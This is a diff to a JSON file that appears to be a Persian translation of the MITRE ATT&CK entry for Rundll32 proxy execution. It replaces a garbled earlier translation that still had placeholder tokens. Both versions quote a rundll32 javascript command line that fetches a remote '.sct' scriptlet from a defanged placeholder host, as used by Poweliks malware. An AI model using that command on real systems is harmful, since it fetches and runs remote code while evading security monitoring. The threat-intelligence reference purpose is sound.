@@ -14,21 +14,21 @@
                     "source_name": "mitre-attack",
                     "url": "https://attack.mitre.org/techniques/T1085",
                     "external_id": "T1085",
-                    "source_name_fa": "حمله mitre"
+                    "source_name_fa": "حمله میتره"
                 },
                 {
                     "source_name": "Trend Micro CPL",
                     "description": "Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017.",
                     "url": "https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf",
-                    "source_name_fa": "Micro CPL",
-                    "description_fa": "Merces، F. (2014) CPL Malware Malicious Control Panel Retrieved 1 نوامبر 2017"
+                    "source_name_fa": "Trend Micro CPL",
+                    "description_fa": "مرسس، اف (2014). CPL Malware Malicious Control Panel Items. بازبینی شده در 1 نوامبر 2017."
                 },
                 {
                     "source_name": "This is Security Command Line Confusion",
                     "description": "B. Ancel. (2014, August 20). Poweliks – Command Line Confusion. Retrieved March 5, 2018.",
                     "url": "https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/",
-                    "source_name_fa": "خط فرمان امنیتی Confusion",
-                    "description_fa": "B. Ancel Poweliks – Command Line Confusion Retrieved 5 مارس 2018"
+                    "source_name_fa": "این سردرگمی در خط فرمان امنیتی است",
+                    "description_fa": "B. Ancel. (20 اوت 2014). Poweliks - سردرگمی خط فرمان. بازبینی شده در 5 مارس 2018."
                 }
             ],
             "object_marking_refs": [
@@ -63,7 +63,7 @@
             ],
             "x_mitre_version": "1.2",
             "name_fa": "Rundll32",
-            "description_fa": "برنامه Rundll32.exe می تواند برای اجرای یک باینری دلخواه فراخوانده شود. مخالفان ممکن است از این قابلیت ها برای اجرای پروکسی کد برای جلوگیری از تحریک ابزارهای امنیتی که ممکن است نظارت بر اجرای قانون ۳۲ نداشته باشند، بهره مند شوند. فرآیند exe به دلیل لیست های سفید یا مثبت کاذب از ویندوز با استفاده از Rundll32 برای عملیات عادی\n\nاجرا می تواند برای اجرای فایل های کنترل پنل (.cpl) از طریق توابع Shell32.dll استفاده شود [CTI_PRESERVE_0] و [CTI_PRESERVE] . دو کلیک کردن بر روی یک فایل .cpl همچنین باعث اجرای اجراdll32.exe می شود. [[ویرایش]\n\nRundll32 همچنین می تواند برای اجرای اسکریپت هایی مانند JavaScript استفاده شود. این کار را می توان با استفاده از یک روش مشابه انجام داد: [CTI_PRESERVE_2] این رفتار توسط بدافزاری مانند Poweliks دیده می شود. [[ویرایش] <code>Control_RunDLL</code> <code>Control_RunDLLAsUser</code> <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code> (Citation: Trend Micro CPL) (Citation: This is Security Command Line Confusion)"
+            "description_fa": "برنامه rundll32.exe را می توان برای اجرای یک باینری دلخواه فراخوانی کرد. دشمنان ممکن است از این عملکرد برای اجرای پروکسی کد استفاده کنند تا از راه‌اندازی ابزارهای امنیتی که ممکن است اجرای فرآیند rundll32.exe را به دلیل لیست‌های سفید یا موارد مثبت کاذب ویندوز با استفاده از rundll32.exe برای عملیات عادی نظارت نکنند، استفاده کنند.\n\nRundll32.exe را می توان برای اجرای فایل های کنترل پنل آیتم (.cpl) از طریق توابع غیرمستند shell32.dll <code>Control_RunDLL</code> و <code>Control_RunDLLAsUser</code> استفاده کرد. دوبار کلیک کردن روی یک فایل cpl نیز باعث اجرای rundll32.exe می شود. (Citation: Trend Micro CPL)\n\nRundll32 همچنین می تواند برای اجرای اسکریپت هایی مانند جاوا اسکریپت استفاده شود. این کار را می توان با استفاده از نحوی مشابه این انجام داد: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code> این رفتار توسط بدافزارهایی مانند Poweliks استفاده شده است. (Citation: This is Security Command Line Confusion)"
         }
     ]
 }
